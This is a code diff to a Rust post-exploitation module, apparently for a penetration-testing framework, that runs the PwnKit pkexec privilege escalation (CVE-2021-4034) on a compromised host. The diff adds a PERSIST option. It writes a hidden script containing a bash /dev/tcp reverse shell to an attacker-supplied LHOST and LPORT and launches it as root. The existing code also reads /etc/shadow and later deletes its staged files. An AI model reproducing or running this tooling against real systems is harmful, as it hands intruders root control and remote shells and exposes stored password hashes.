@@ -29,6 +29,14 @@ static CLEANUP_NAME: &str = "CLEANUP";
 static CLEANUP_DESC: &str = "Remove staged files after execution";
 static CLEANUP_DEFAULT: &str = "true";
 
+static PERSIST_NAME: &str = "PERSIST";
+static PERSIST_DESC: &str = "Spawn a reverse shell as root after escalation";
+static PERSIST_DEFAULT: &str = "false";
+
+static LPORT_NAME: &str = "LPORT";
+static LPORT_DESC: &str = "Port for the root reverse shell (used with PERSIST)";
+static LPORT_DEFAULT: &str = "4445";
+
 static OPTIONS: &[ModuleOption] = &[
     ModuleOption {
         name: CString {
@@ -76,6 +84,38 @@ static OPTIONS: &[ModuleOption] = &[
         default_value: CString {
             ptr: CLEANUP_DEFAULT.as_ptr() as *const c_char,
             len: CLEANUP_DEFAULT.len(),
+        },
+    },
+    ModuleOption {
+        name: CString {
+            ptr: PERSIST_NAME.as_ptr() as *const c_char,
+            len: PERSIST_NAME.len(),
+        },
+        description: CString {
+            ptr: PERSIST_DESC.as_ptr() as *const c_char,
+            len: PERSIST_DESC.len(),
+        },
+        required: false,
+        option_type: OptionType::Bool,
+        default_value: CString {
+            ptr: PERSIST_DEFAULT.as_ptr() as *const c_char,
+            len: PERSIST_DEFAULT.len(),
+        },
+    },
+    ModuleOption {
+        name: CString {
+            ptr: LPORT_NAME.as_ptr() as *const c_char,
+            len: LPORT_NAME.len(),
+        },
+        description: CString {
+            ptr: LPORT_DESC.as_ptr() as *const c_char,
+            len: LPORT_DESC.len(),
+        },
+        required: false,
+        option_type: OptionType::String,
+        default_value: CString {
+            ptr: LPORT_DEFAULT.as_ptr() as *const c_char,
+            len: LPORT_DEFAULT.len(),
         },
     },
 ];
@@ -136,6 +176,12 @@ struct PostOptions {
     writeable_dir: String,
     #[serde(rename = "CLEANUP", default = "default_cleanup")]
     cleanup: String,
+    #[serde(rename = "PERSIST", default = "default_persist")]
+    persist: String,
+    #[serde(rename = "LPORT", default = "default_lport")]
+    lport: String,
+    #[serde(rename = "LHOST")]
+    lhost: Option<String>,
 }
 
 fn default_writeable_dir() -> String {
@@ -144,6 +190,14 @@ fn default_writeable_dir() -> String {
 
 fn default_cleanup() -> String {
     "true".to_string()
+}
+
+fn default_persist() -> String {
+    "false".to_string()
+}
+
+fn default_lport() -> String {
+    "4445".to_string()
 }
 
 extern "C" fn get_info() -> *const ModuleInfo {
@@ -225,6 +279,9 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     let ctx = SessionCtx { api, session_id };
     let work_dir = options.writeable_dir.trim_end_matches('/');
     let cleanup = options.cleanup.to_lowercase() == "true";
+    let persist = options.persist.to_lowercase() == "true";
+    let lport = options.lport.clone();
+    let lhost = options.lhost.clone().unwrap_or_default();
 
     eprintln!("[*] PwnKit LPE (CVE-2021-4034)");
     eprintln!("[*] Polkit pkexec local privilege escalation");
@@ -270,7 +327,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     } else if !ctx.exec("which cc 2>/dev/null").is_empty() {
         "cc"
     } else {
-        eprintln!("[!] No compiler found — attempting pre-compiled binary fallback.");
+        eprintln!("[!] No compiler found - attempting pre-compiled binary fallback.");
         eprintln!("[-] Cannot proceed without gcc or cc on target.");
         return 1;
     };
@@ -379,9 +436,38 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     eprintln!("[!] Note: This exploit may leave traces in system logs. This is expected behavior from the Qualys-documented exploitation path.");
     eprintln!();
 
+    // When PERSIST is enabled, write a reverse shell script to disk and invoke
+    // it in the same pwnkit_exploit pipe. gconv_init() self-cleans GCONV_PATH=.
+    // and pwnkit/ before spawning the root shell, so a second pwnkit_exploit
+    // run would fail. Writing to a script avoids shell quoting issues entirely.
+    if persist {
+        if lhost.is_empty() {
+            eprintln!("[-] PERSIST requires LHOST to be set");
+            do_cleanup(&ctx, work_dir, cleanup);
+            return 1;
+        }
+        let persist_script = format!("{}/._persist.sh", work_dir);
+        let script_content = format!(
+            "#!/bin/bash\nbash -i >& /dev/tcp/{}/{} 0>&1 &\n",
+            lhost, lport
+        );
+        if !ctx.write_file(&persist_script, &script_content) {
+            eprintln!("[-] Failed to write persist script");
+            do_cleanup(&ctx, work_dir, cleanup);
+            return 1;
+        }
+        ctx.exec(&format!("chmod +x '{}'", persist_script));
+    }
+
+    let exec_cmd = if persist {
+        format!("id && whoami && echo PWNKIT_SUCCESS && bash {}/._persist.sh", work_dir)
+    } else {
+        "id && whoami && echo PWNKIT_SUCCESS".to_string()
+    };
+
     let exec_result = ctx.exec(&format!(
-        "cd '{}' && echo 'id && whoami && echo PWNKIT_SUCCESS' | ./pwnkit_exploit 2>/dev/null",
-        work_dir
+        "cd '{}' && echo '{}' | ./pwnkit_exploit 2>/dev/null",
+        work_dir, exec_cmd
     ));
 
     if exec_result.contains("uid=0") {
@@ -395,15 +481,19 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
         eprintln!("[+] Current session now has root privileges.");
         eprintln!();
 
-        let root_check = ctx.exec(&format!(
-            "cd '{}' && echo 'cat /etc/shadow | head -3' | ./pwnkit_exploit 2>/dev/null",
-            work_dir
-        ));
-        if !root_check.is_empty() {
-            eprintln!("[+] Shadow file accessible (root verification):");
-            for line in root_check.lines().take(3) {
-                if !line.is_empty() {
-                    eprintln!("    {}", line);
+        if persist {
+            eprintln!("[+] Root reverse shell dispatched - catch it with multi_handler on LPORT {}", lport);
+        } else {
+            let root_check = ctx.exec(&format!(
+                "cd '{}' && echo 'cat /etc/shadow | head -3' | ./pwnkit_exploit 2>/dev/null",
+                work_dir
+            ));
+            if !root_check.is_empty() {
+                eprintln!("[+] Shadow file accessible (root verification):");
+                for line in root_check.lines().take(3) {
+                    if !line.is_empty() {
+                        eprintln!("    {}", line);
+                    }
                 }
             }
         }
@@ -428,16 +518,16 @@ fn do_cleanup(ctx: &SessionCtx, work_dir: &str, cleanup: bool) {
     if cleanup {
         eprintln!("[*] Step 5: Cleaning up staged files");
         ctx.exec(&format!(
-            "cd '{}' && rm -rf 'GCONV_PATH=.' pwnkit pwnkit_exploit evil-so.c exploit.c 2>/dev/null",
+            "cd '{}' && rm -rf 'GCONV_PATH=.' pwnkit pwnkit_exploit evil-so.c exploit.c ._persist.sh 2>/dev/null",
             work_dir
         ));
         eprintln!("[*] Cleanup complete.");
     } else {
-        eprintln!("[*] Cleanup disabled — exploit files remain in {}", work_dir);
+        eprintln!("[*] Cleanup disabled - exploit files remain in {}", work_dir);
     }
 }
 
-/// Minimal base64 encoder — avoids pulling in a crate dependency for this one use.
+/// Minimal base64 encoder - avoids pulling in a crate dependency for this one use.
 fn base64_encode(input: &[u8]) -> String {
     const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     let mut out = String::with_capacity((input.len() + 2) / 3 * 4);
@@ -468,6 +558,9 @@ fn parse_options(config: *const c_char) -> Result<PostOptions, Box<dyn std::erro
             session: None,
             writeable_dir: default_writeable_dir(),
             cleanup: default_cleanup(),
+            persist: default_persist(),
+            lport: default_lport(),
+            lhost: None,
         });
     }
     Ok(serde_json::from_str(unsafe {
